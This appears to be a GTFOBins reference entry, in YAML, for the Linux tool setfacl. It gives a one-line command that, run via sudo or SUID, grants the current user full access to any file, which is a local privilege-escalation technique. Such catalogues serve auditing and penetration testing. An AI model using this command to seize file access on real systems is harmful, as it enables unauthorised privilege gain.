<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/setfacl -->
---
functions:
  privilege-escalation:
  - code: |-
      setfacl -m u:$(id -un):rwx /path/to/input-file
    comment: |-
      This can be run with elevated privileges to change ownership and then read, write, or execute a file.
    contexts:
      sudo:
      suid:
...
